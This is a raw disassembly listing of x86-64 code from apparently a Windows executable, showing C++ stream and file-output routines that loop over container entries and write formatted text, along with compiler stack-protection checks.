   140007183:	48 83 c4 20          	add    $0x20,%rsp
   140007187:	5f                   	pop    %rdi
   140007188:	c3                   	ret
   140007189:	48 8b 07             	mov    (%rdi),%rax
   14000718c:	48 8b cf             	mov    %rdi,%rcx
   14000718f:	ff 50 38             	call   *0x38(%rax)
   140007192:	8b d8                	mov    %eax,%ebx
   140007194:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007197:	75 0b                	jne    0x1400071a4
   140007199:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000719e:	48 83 c4 20          	add    $0x20,%rsp
   1400071a2:	5f                   	pop    %rdi
   1400071a3:	c3                   	ret
   1400071a4:	48 8b 07             	mov    (%rdi),%rax
   1400071a7:	8b d3                	mov    %ebx,%edx
   1400071a9:	48 8b cf             	mov    %rdi,%rcx
   1400071ac:	ff 50 20             	call   *0x20(%rax)
   1400071af:	8b c3                	mov    %ebx,%eax
   1400071b1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400071b6:	48 83 c4 20          	add    $0x20,%rsp
   1400071ba:	5f                   	pop    %rdi
   1400071bb:	c3                   	ret
   1400071bc:	cc                   	int3
   1400071bd:	cc                   	int3
   1400071be:	cc                   	int3
   1400071bf:	cc                   	int3
   1400071c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400071c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400071ca:	57                   	push   %rdi
   1400071cb:	48 83 ec 20          	sub    $0x20,%rsp
   1400071cf:	48 8b f9             	mov    %rcx,%rdi
   1400071d2:	ff 15 98 2f 00 00    	call   *0x2f98(%rip)        # 0x14000a170
   1400071d8:	48 8b d8             	mov    %rax,%rbx
   1400071db:	48 85 c0             	test   %rax,%rax
   1400071de:	0f 84 8c 00 00 00    	je     0x140007270
   1400071e4:	48 8b cf             	mov    %rdi,%rcx
   1400071e7:	ff 15 9b 2f 00 00    	call   *0x2f9b(%rip)        # 0x14000a188
   1400071ed:	48 3b d8             	cmp    %rax,%rbx
   1400071f0:	73 13                	jae    0x140007205
   1400071f2:	0f b6 03             	movzbl (%rbx),%eax
   1400071f5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400071fa:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400071ff:	48 83 c4 20          	add    $0x20,%rsp
   140007203:	5f                   	pop    %rdi
   140007204:	c3                   	ret
   140007205:	48 8b cf             	mov    %rdi,%rcx
   140007208:	ff 15 72 2f 00 00    	call   *0x2f72(%rip)        # 0x14000a180
   14000720e:	48 85 c0             	test   %rax,%rax
   140007211:	74 5d                	je     0x140007270
   140007213:	f6 47 70 04          	testb  $0x4,0x70(%rdi)
   140007217:	75 57                	jne    0x140007270
   140007219:	48 8b 77 68          	mov    0x68(%rdi),%rsi
   14000721d:	48 3b f0             	cmp    %rax,%rsi
   140007220:	48 0f 42 f0          	cmovb  %rax,%rsi
   140007224:	48 3b f3             	cmp    %rbx,%rsi
   140007227:	76 47                	jbe    0x140007270
   140007229:	48 8b cf             	mov    %rdi,%rcx
   14000722c:	48 89 77 68          	mov    %rsi,0x68(%rdi)
   140007230:	ff 15 3a 2f 00 00    	call   *0x2f3a(%rip)        # 0x14000a170
   140007236:	48 8b cf             	mov    %rdi,%rcx
   140007239:	48 8b d8             	mov    %rax,%rbx
   14000723c:	ff 15 26 2f 00 00    	call   *0x2f26(%rip)        # 0x14000a168
   140007242:	4c 8b ce             	mov    %rsi,%r9
   140007245:	4c 8b c3             	mov    %rbx,%r8
   140007248:	48 8b d0             	mov    %rax,%rdx
   14000724b:	48 8b cf             	mov    %rdi,%rcx
   14000724e:	ff 15 44 2f 00 00    	call   *0x2f44(%rip)        # 0x14000a198
   140007254:	48 8b cf             	mov    %rdi,%rcx
   140007257:	ff 15 13 2f 00 00    	call   *0x2f13(%rip)        # 0x14000a170
   14000725d:	0f b6 00             	movzbl (%rax),%eax
   140007260:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007265:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000726a:	48 83 c4 20          	add    $0x20,%rsp
   14000726e:	5f                   	pop    %rdi
   14000726f:	c3                   	ret
   140007270:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007275:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000727a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000727f:	48 83 c4 20          	add    $0x20,%rsp
   140007283:	5f                   	pop    %rdi
   140007284:	c3                   	ret
   140007285:	cc                   	int3
   140007286:	cc                   	int3
   140007287:	cc                   	int3
   140007288:	cc                   	int3
   140007289:	cc                   	int3
   14000728a:	cc                   	int3
   14000728b:	cc                   	int3
   14000728c:	cc                   	int3
   14000728d:	cc                   	int3
   14000728e:	cc                   	int3
   14000728f:	cc                   	int3
   140007290:	40 55                	rex push %rbp
   140007292:	53                   	push   %rbx
   140007293:	56                   	push   %rsi
   140007294:	57                   	push   %rdi
   140007295:	41 55                	push   %r13
   140007297:	41 56                	push   %r14
   140007299:	41 57                	push   %r15
   14000729b:	48 8d ac 24 70 ff ff 	lea    -0x90(%rsp),%rbp
   1400072a2:	ff 
   1400072a3:	48 81 ec 90 01 00 00 	sub    $0x190,%rsp
   1400072aa:	48 8b 05 0f b9 00 00 	mov    0xb90f(%rip),%rax        # 0x140012bc0
   1400072b1:	48 33 c4             	xor    %rsp,%rax
   1400072b4:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   1400072bb:	4d 8b f8             	mov    %r8,%r15
   1400072be:	48 8b f2             	mov    %rdx,%rsi
   1400072c1:	48 8b f9             	mov    %rcx,%rdi
   1400072c4:	48 8b d1             	mov    %rcx,%rdx
   1400072c7:	48 83 79 18 0f       	cmpq   $0xf,0x18(%rcx)
   1400072cc:	76 03                	jbe    0x1400072d1
   1400072ce:	48 8b 11             	mov    (%rcx),%rdx
   1400072d1:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400072d8:	00 
   1400072d9:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1400072df:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400072e5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400072ea:	e8 81 e4 ff ff       	call   0x140005770
   1400072ef:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400072f4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400072f8:	48 8d 05 31 43 00 00 	lea    0x4331(%rip),%rax        # 0x14000b630
   1400072ff:	48 89 44 0c 30       	mov    %rax,0x30(%rsp,%rcx,1)
   140007304:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007309:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000730d:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140007313:	89 54 0c 2c          	mov    %edx,0x2c(%rsp,%rcx,1)
   140007317:	48 83 7d b8 00       	cmpq   $0x0,-0x48(%rbp)
   14000731c:	75 40                	jne    0x14000735e
   14000731e:	48 8d 15 2b 43 00 00 	lea    0x432b(%rip),%rdx        # 0x14000b650
   140007325:	48 8b 0d cc 2d 00 00 	mov    0x2dcc(%rip),%rcx        # 0x14000a0f8
   14000732c:	e8 1f 9d ff ff       	call   0x140001050
   140007331:	4c 8b 47 10          	mov    0x10(%rdi),%r8
   140007335:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   14000733a:	76 03                	jbe    0x14000733f
   14000733c:	48 8b 3f             	mov    (%rdi),%rdi
   14000733f:	48 8b d7             	mov    %rdi,%rdx
   140007342:	48 8b c8             	mov    %rax,%rcx
   140007345:	e8 86 a3 ff ff       	call   0x1400016d0
   14000734a:	48 8d 15 ef 42 00 00 	lea    0x42ef(%rip),%rdx        # 0x14000b640
   140007351:	48 8b c8             	mov    %rax,%rcx
   140007354:	e8 f7 9c ff ff       	call   0x140001050
   140007359:	e9 0b 04 00 00       	jmp    0x140007769
   14000735e:	48 8d 15 eb 44 00 00 	lea    0x44eb(%rip),%rdx        # 0x14000b850
   140007365:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000736a:	e8 e1 9c ff ff       	call   0x140001050
   14000736f:	48 8b c8             	mov    %rax,%rcx
   140007372:	48 8d 15 37 33 00 00 	lea    0x3337(%rip),%rdx        # 0x14000a6b0
   140007379:	e8 d2 9c ff ff       	call   0x140001050
   14000737e:	48 8b c8             	mov    %rax,%rcx
   140007381:	48 8d 15 b8 44 00 00 	lea    0x44b8(%rip),%rdx        # 0x14000b840
   140007388:	e8 c3 9c ff ff       	call   0x140001050
   14000738d:	48 8d 15 cc 44 00 00 	lea    0x44cc(%rip),%rdx        # 0x14000b860
   140007394:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007399:	e8 b2 9c ff ff       	call   0x140001050
   14000739e:	48 8b c8             	mov    %rax,%rcx
   1400073a1:	48 8d 15 20 33 00 00 	lea    0x3320(%rip),%rdx        # 0x14000a6c8
   1400073a8:	e8 a3 9c ff ff       	call   0x140001050
   1400073ad:	48 8b c8             	mov    %rax,%rcx
   1400073b0:	48 8d 15 f1 32 00 00 	lea    0x32f1(%rip),%rdx        # 0x14000a6a8
   1400073b7:	e8 94 9c ff ff       	call   0x140001050
   1400073bc:	48 8d 15 ad 44 00 00 	lea    0x44ad(%rip),%rdx        # 0x14000b870
   1400073c3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400073c8:	e8 83 9c ff ff       	call   0x140001050
   1400073cd:	48 8b d8             	mov    %rax,%rbx
   1400073d0:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400073d4:	e8 87 ec ff ff       	call   0x140006060
   1400073d9:	90                   	nop
   1400073da:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400073de:	48 83 78 18 0f       	cmpq   $0xf,0x18(%rax)
   1400073e3:	76 03                	jbe    0x1400073e8
   1400073e5:	48 8b 00             	mov    (%rax),%rax
   1400073e8:	48 8b d0             	mov    %rax,%rdx
   1400073eb:	48 8b cb             	mov    %rbx,%rcx
   1400073ee:	e8 dd a2 ff ff       	call   0x1400016d0
   1400073f3:	48 8d 15 ae 32 00 00 	lea    0x32ae(%rip),%rdx        # 0x14000a6a8
   1400073fa:	48 8b c8             	mov    %rax,%rcx
   1400073fd:	e8 4e 9c ff ff       	call   0x140001050
   140007402:	90                   	nop
   140007403:	48 8b 55 78          	mov    0x78(%rbp),%rdx
   140007407:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000740b:	76 47                	jbe    0x140007454
   14000740d:	48 ff c2             	inc    %rdx
   140007410:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140007414:	48 8b c1             	mov    %rcx,%rax
   140007417:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000741e:	72 2f                	jb     0x14000744f
   140007420:	48 83 c2 27          	add    $0x27,%rdx
   140007424:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140007428:	48 2b c1             	sub    %rcx,%rax
   14000742b:	48 83 e8 08          	sub    $0x8,%rax
   14000742f:	48 83 f8 1f          	cmp    $0x1f,%rax
   140007433:	76 1a                	jbe    0x14000744f
   140007435:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000743c:	00 00 
   14000743e:	45 33 c9             	xor    %r9d,%r9d
   140007441:	45 33 c0             	xor    %r8d,%r8d
   140007444:	33 d2                	xor    %edx,%edx
   140007446:	33 c9                	xor    %ecx,%ecx
   140007448:	ff 15 1a 30 00 00    	call   *0x301a(%rip)        # 0x14000a468
   14000744e:	cc                   	int3
   14000744f:	e8 84 13 00 00       	call   0x1400087d8
   140007454:	48 8d 15 4d 32 00 00 	lea    0x324d(%rip),%rdx        # 0x14000a6a8
   14000745b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007460:	e8 eb 9b ff ff       	call   0x140001050
   140007465:	48 8d 15 14 44 00 00 	lea    0x4414(%rip),%rdx        # 0x14000b880
   14000746c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007471:	e8 da 9b ff ff       	call   0x140001050
   140007476:	4c 8b 76 08          	mov    0x8(%rsi),%r14
   14000747a:	48 8b 36             	mov    (%rsi),%rsi
   14000747d:	49 3b f6             	cmp    %r14,%rsi
   140007480:	0f 84 a4 00 00 00    	je     0x14000752a
   140007486:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000748d:	00 00 00 
   140007490:	48 8d 15 39 ee ff ff 	lea    -0x11c7(%rip),%rdx        # 0x1400062d0
   140007497:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000749c:	ff 15 36 2c 00 00    	call   *0x2c36(%rip)        # 0x14000a0d8
   1400074a2:	48 8b d8             	mov    %rax,%rbx
   1400074a5:	ba 32 00 00 00       	mov    $0x32,%edx
   1400074aa:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400074ae:	e8 b6 12 00 00       	call   0x140008769
   1400074b3:	48 8b 0b             	mov    (%rbx),%rcx
   1400074b6:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   1400074ba:	48 03 cb             	add    %rbx,%rcx
   1400074bd:	4c 8b 00             	mov    (%rax),%r8
   1400074c0:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400074c4:	41 ff d0             	call   *%r8
   1400074c7:	48 8b 16             	mov    (%rsi),%rdx
   1400074ca:	48 8b cb             	mov    %rbx,%rcx
   1400074cd:	e8 7e 9b ff ff       	call   0x140001050
   1400074d2:	48 8b c8             	mov    %rax,%rcx
   1400074d5:	48 8d 15 bc 43 00 00 	lea    0x43bc(%rip),%rdx        # 0x14000b898
   1400074dc:	e8 6f 9b ff ff       	call   0x140001050
   1400074e1:	48 8d 15 c8 aa ff ff 	lea    -0x5538(%rip),%rdx        # 0x140001fb0
   1400074e8:	48 8b c8             	mov    %rax,%rcx
   1400074eb:	ff 15 e7 2b 00 00    	call   *0x2be7(%rip)        # 0x14000a0d8
   1400074f1:	48 8b 56 20          	mov    0x20(%rsi),%rdx
   1400074f5:	48 8b c8             	mov    %rax,%rcx
   1400074f8:	ff 15 e2 2b 00 00    	call   *0x2be2(%rip)        # 0x14000a0e0
   1400074fe:	48 8d 15 7b aa ff ff 	lea    -0x5585(%rip),%rdx        # 0x140001f80
   140007505:	48 8b c8             	mov    %rax,%rcx
   140007508:	ff 15 ca 2b 00 00    	call   *0x2bca(%rip)        # 0x14000a0d8
   14000750e:	48 8b c8             	mov    %rax,%rcx
   140007511:	48 8d 15 90 31 00 00 	lea    0x3190(%rip),%rdx        # 0x14000a6a8
   140007518:	e8 33 9b ff ff       	call   0x140001050
   14000751d:	48 83 c6 28          	add    $0x28,%rsi
   140007521:	49 3b f6             	cmp    %r14,%rsi
   140007524:	0f 85 66 ff ff ff    	jne    0x140007490
   14000752a:	48 8d 15 6f 43 00 00 	lea    0x436f(%rip),%rdx        # 0x14000b8a0
   140007531:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007536:	e8 15 9b ff ff       	call   0x140001050
   14000753b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000753e:	0f 11 45 40          	movups %xmm0,0x40(%rbp)
   140007542:	33 db                	xor    %ebx,%ebx
   140007544:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   140007548:	41 be 0f 00 00 00    	mov    $0xf,%r14d
   14000754e:	4c 89 75 58          	mov    %r14,0x58(%rbp)
   140007552:	88 5d 40             	mov    %bl,0x40(%rbp)
   140007555:	4d 8b 6f 08          	mov    0x8(%r15),%r13
   140007559:	4d 8b 3f             	mov    (%r15),%r15
   14000755c:	4d 3b fd             	cmp    %r13,%r15
   14000755f:	0f 84 35 01 00 00    	je     0x14000769a
   140007565:	49 8b 37             	mov    (%r15),%rsi
   140007568:	48 8b ce             	mov    %rsi,%rcx
   14000756b:	e8 f8 20 00 00       	call   0x140009668
   140007570:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   140007574:	49 83 fe 0f          	cmp    $0xf,%r14
   140007578:	48 0f 47 4d 40       	cmova  0x40(%rbp),%rcx
   14000757d:	48 3b d8             	cmp    %rax,%rbx
   140007580:	75 14                	jne    0x140007596
   140007582:	48 85 db             	test   %rbx,%rbx
   140007585:	74 60                	je     0x1400075e7
   140007587:	4c 8b c3             	mov    %rbx,%r8
   14000758a:	48 8b d6             	mov    %rsi,%rdx
   14000758d:	e8 ac 20 00 00       	call   0x14000963e
   140007592:	85 c0                	test   %eax,%eax
   140007594:	74 51                	je     0x1400075e7
   140007596:	48 8b ce             	mov    %rsi,%rcx
   140007599:	e8 ca 20 00 00       	call   0x140009668
   14000759e:	4c 8b c0             	mov    %rax,%r8
   1400075a1:	48 8b d6             	mov    %rsi,%rdx
   1400075a4:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   1400075a8:	e8 93 a7 ff ff       	call   0x140001d40
   1400075ad:	48 8d 15 04 43 00 00 	lea    0x4304(%rip),%rdx        # 0x14000b8b8
   1400075b4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400075b9:	e8 92 9a ff ff       	call   0x140001050
   1400075be:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   1400075c2:	48 83 7d 58 0f       	cmpq   $0xf,0x58(%rbp)
   1400075c7:	48 0f 47 55 40       	cmova  0x40(%rbp),%rdx
   1400075cc:	4c 8b 45 50          	mov    0x50(%rbp),%r8
   1400075d0:	48 8b c8             	mov    %rax,%rcx
   1400075d3:	e8 f8 a0 ff ff       	call   0x1400016d0
   1400075d8:	48 8d 15 d5 42 00 00 	lea    0x42d5(%rip),%rdx        # 0x14000b8b4
   1400075df:	48 8b c8             	mov    %rax,%rcx
   1400075e2:	e8 69 9a ff ff       	call   0x140001050
   1400075e7:	48 8d 15 ce 42 00 00 	lea    0x42ce(%rip),%rdx        # 0x14000b8bc
   1400075ee:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400075f3:	e8 58 9a ff ff       	call   0x140001050
   1400075f8:	48 8d 15 d1 ec ff ff 	lea    -0x132f(%rip),%rdx        # 0x1400062d0
   1400075ff:	48 8b c8             	mov    %rax,%rcx
   140007602:	ff 15 d0 2a 00 00    	call   *0x2ad0(%rip)        # 0x14000a0d8
   140007608:	48 8b d8             	mov    %rax,%rbx
   14000760b:	ba 28 00 00 00       	mov    $0x28,%edx
   140007610:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140007614:	e8 50 11 00 00       	call   0x140008769
   140007619:	48 8b 0b             	mov    (%rbx),%rcx
   14000761c:	48 63 49 04          	movslq 0x4(%rcx),%rcx
   140007620:	48 03 cb             	add    %rbx,%rcx
   140007623:	4c 8b 00             	mov    (%rax),%r8
   140007626:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000762a:	41 ff d0             	call   *%r8
   14000762d:	49 8b 57 08          	mov    0x8(%r15),%rdx
   140007631:	48 8b cb             	mov    %rbx,%rcx
   140007634:	e8 17 9a ff ff       	call   0x140001050
   140007639:	48 8b c8             	mov    %rax,%rcx
   14000763c:	48 8d 15 55 42 00 00 	lea    0x4255(%rip),%rdx        # 0x14000b898
   140007643:	e8 08 9a ff ff       	call   0x140001050
   140007648:	48 8d 15 61 a9 ff ff 	lea    -0x569f(%rip),%rdx        # 0x140001fb0
   14000764f:	48 8b c8             	mov    %rax,%rcx
   140007652:	ff 15 80 2a 00 00    	call   *0x2a80(%rip)        # 0x14000a0d8
   140007658:	41 8b 57 10          	mov    0x10(%r15),%edx
   14000765c:	48 8b c8             	mov    %rax,%rcx
   14000765f:	ff 15 cb 2b 00 00    	call   *0x2bcb(%rip)        # 0x14000a230
   140007665:	48 8d 15 14 a9 ff ff 	lea    -0x56ec(%rip),%rdx        # 0x140001f80
   14000766c:	48 8b c8             	mov    %rax,%rcx
   14000766f:	ff 15 63 2a 00 00    	call   *0x2a63(%rip)        # 0x14000a0d8
   140007675:	48 8b c8             	mov    %rax,%rcx
   140007678:	48 8d 15 29 30 00 00 	lea    0x3029(%rip),%rdx        # 0x14000a6a8
   14000767f:	e8 cc 99 ff ff       	call   0x140001050
   140007684:	49 83 c7 18          	add    $0x18,%r15
   140007688:	4d 3b fd             	cmp    %r13,%r15
   14000768b:	74 0d                	je     0x14000769a
   14000768d:	4c 8b 75 58          	mov    0x58(%rbp),%r14
   140007691:	48 8b 5d 50          	mov    0x50(%rbp),%rbx
   140007695:	e9 cb fe ff ff       	jmp    0x140007565
   14000769a:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   14000769f:	e8 0c e9 ff ff       	call   0x140005fb0
   1400076a4:	48 85 c0             	test   %rax,%rax
   1400076a7:	75 1f                	jne    0x1400076c8
   1400076a9:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400076ae:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400076b2:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400076b7:	48 03 c8             	add    %rax,%rcx
   1400076ba:	45 33 c0             	xor    %r8d,%r8d
   1400076bd:	ba 02 00 00 00       	mov    $0x2,%edx
   1400076c2:	ff 15 e0 2b 00 00    	call   *0x2be0(%rip)        # 0x14000a2a8
   1400076c8:	48 8d 15 f1 41 00 00 	lea    0x41f1(%rip),%rdx        # 0x14000b8c0
   1400076cf:	48 8b 0d 1a 2a 00 00 	mov    0x2a1a(%rip),%rcx        # 0x14000a0f0
   1400076d6:	e8 75 99 ff ff       	call   0x140001050
   1400076db:	4c 8b 47 10          	mov    0x10(%rdi),%r8
   1400076df:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   1400076e4:	76 03                	jbe    0x1400076e9
   1400076e6:	48 8b 3f             	mov    (%rdi),%rdi
   1400076e9:	48 8b d7             	mov    %rdi,%rdx
   1400076ec:	48 8b c8             	mov    %rax,%rcx
   1400076ef:	e8 dc 9f ff ff       	call   0x1400016d0
   1400076f4:	48 8d 15 ad 2f 00 00 	lea    0x2fad(%rip),%rdx        # 0x14000a6a8
   1400076fb:	48 8b c8             	mov    %rax,%rcx
   1400076fe:	e8 4d 99 ff ff       	call   0x140001050
   140007703:	90                   	nop
   140007704:	48 8b 55 58          	mov    0x58(%rbp),%rdx
   140007708:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000770c:	76 47                	jbe    0x140007755
   14000770e:	48 ff c2             	inc    %rdx
   140007711:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   140007715:	48 8b c1             	mov    %rcx,%rax
   140007718:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000771f:	72 2f                	jb     0x140007750
   140007721:	48 83 c2 27          	add    $0x27,%rdx
   140007725:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140007729:	48 2b c1             	sub    %rcx,%rax
   14000772c:	48 83 e8 08          	sub    $0x8,%rax
   140007730:	48 83 f8 1f          	cmp    $0x1f,%rax
   140007734:	76 1a                	jbe    0x140007750
   140007736:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000773d:	00 00 
   14000773f:	45 33 c9             	xor    %r9d,%r9d
   140007742:	45 33 c0             	xor    %r8d,%r8d
   140007745:	33 d2                	xor    %edx,%edx
   140007747:	33 c9                	xor    %ecx,%ecx
   140007749:	ff 15 19 2d 00 00    	call   *0x2d19(%rip)        # 0x14000a468
   14000774f:	cc                   	int3
   140007750:	e8 83 10 00 00       	call   0x1400087d8
   140007755:	48 c7 45 50 00 00 00 	movq   $0x0,0x50(%rbp)
   14000775c:	00 
   14000775d:	48 c7 45 58 0f 00 00 	movq   $0xf,0x58(%rbp)
   140007764:	00 
   140007765:	c6 45 40 00          	movb   $0x0,0x40(%rbp)
   140007769:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000776e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007772:	48 8d 05 b7 3e 00 00 	lea    0x3eb7(%rip),%rax        # 0x14000b630
   140007779:	48 89 44 0c 30       	mov    %rax,0x30(%rsp,%rcx,1)
   14000777e:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007783:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007787:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   14000778d:	89 54 0c 2c          	mov    %edx,0x2c(%rsp,%rcx,1)
   140007791:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140007796:	e8 55 e2 ff ff       	call   0x1400059f0
   14000779b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400077a0:	ff 15 82 2a 00 00    	call   *0x2a82(%rip)        # 0x14000a228
   1400077a6:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400077aa:	ff 15 60 2a 00 00    	call   *0x2a60(%rip)        # 0x14000a210
   1400077b0:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   1400077b7:	48 33 cc             	xor    %rsp,%rcx
   1400077ba:	e8 b1 10 00 00       	call   0x140008870
   1400077bf:	48 81 c4 90 01 00 00 	add    $0x190,%rsp
   1400077c6:	41 5f                	pop    %r15
   1400077c8:	41 5e                	pop    %r14
   1400077ca:	41 5d                	pop    %r13
   1400077cc:	5f                   	pop    %rdi
   1400077cd:	5e                   	pop    %rsi
   1400077ce:	5b                   	pop    %rbx
   1400077cf:	5d                   	pop    %rbp
   1400077d0:	c3                   	ret
   1400077d1:	cc                   	int3
   1400077d2:	cc                   	int3
   1400077d3:	cc                   	int3
   1400077d4:	cc                   	int3
   1400077d5:	cc                   	int3
   1400077d6:	cc                   	int3
   1400077d7:	cc                   	int3
   1400077d8:	cc                   	int3
   1400077d9:	cc                   	int3
   1400077da:	cc                   	int3
   1400077db:	cc                   	int3
   1400077dc:	cc                   	int3
   1400077dd:	cc                   	int3
   1400077de:	cc                   	int3
   1400077df:	cc                   	int3
   1400077e0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400077e5:	55                   	push   %rbp
   1400077e6:	56                   	push   %rsi
   1400077e7:	57                   	push   %rdi
   1400077e8:	41 54                	push   %r12
   1400077ea:	41 55                	push   %r13
   1400077ec:	41 56                	push   %r14
   1400077ee:	41 57                	push   %r15
   1400077f0:	48 8d ac 24 60 ff ff 	lea    -0xa0(%rsp),%rbp
   1400077f7:	ff 
   1400077f8:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   1400077ff:	48 8b 05 ba b3 00 00 	mov    0xb3ba(%rip),%rax        # 0x140012bc0
   140007806:	48 33 c4             	xor    %rsp,%rax
   140007809:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   140007810:	4d 8b e0             	mov    %r8,%r12
   140007813:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
   140007818:	48 8b da             	mov    %rdx,%rbx
   14000781b:	48 8b f9             	mov    %rcx,%rdi
   14000781e:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140007823:	48 8b d1             	mov    %rcx,%rdx
   140007826:	48 83 79 18 0f       	cmpq   $0xf,0x18(%rcx)
   14000782b:	76 03                	jbe    0x140007830
   14000782d:	48 8b 11             	mov    (%rcx),%rdx
   140007830:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140007837:	00 
   140007838:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   14000783e:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140007844:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140007849:	e8 22 df ff ff       	call   0x140005770
   14000784e:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140007853:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007857:	48 8d 05 d2 3d 00 00 	lea    0x3dd2(%rip),%rax        # 0x14000b630
   14000785e:	48 89 44 0c 40       	mov    %rax,0x40(%rsp,%rcx,1)
   140007863:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140007868:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000786c:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140007872:	89 54 0c 3c          	mov    %edx,0x3c(%rsp,%rcx,1)
   140007876:	48 83 7d c8 00       	cmpq   $0x0,-0x38(%rbp)
   14000787b:	75 40                	jne    0x1400078bd
   14000787d:	48 8d 15 cc 3d 00 00 	lea    0x3dcc(%rip),%rdx        # 0x14000b650
   140007884:	48 8b 0d 6d 28 00 00 	mov    0x286d(%rip),%rcx        # 0x14000a0f8
   14000788b:	e8 c0 97 ff ff       	call   0x140001050
   140007890:	4c 8b 47 10          	mov    0x10(%rdi),%r8
   140007894:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   140007899:	76 03                	jbe    0x14000789e
   14000789b:	48 8b 3f             	mov    (%rdi),%rdi
   14000789e:	48 8b d7             	mov    %rdi,%rdx
   1400078a1:	48 8b c8             	mov    %rax,%rcx
   1400078a4:	e8 27 9e ff ff       	call   0x1400016d0
   1400078a9:	48 8d 15 90 3d 00 00 	lea    0x3d90(%rip),%rdx        # 0x14000b640
   1400078b0:	48 8b c8             	mov    %rax,%rcx
   1400078b3:	e8 98 97 ff ff       	call   0x140001050
   1400078b8:	e9 b3 05 00 00       	jmp    0x140007e70
   1400078bd:	48 8d 15 9c 3d 00 00 	lea    0x3d9c(%rip),%rdx        # 0x14000b660
   1400078c4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400078c9:	e8 82 97 ff ff       	call   0x140001050
   1400078ce:	48 8d 15 9b 3d 00 00 	lea    0x3d9b(%rip),%rdx        # 0x14000b670
   1400078d5:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400078da:	e8 71 97 ff ff       	call   0x140001050
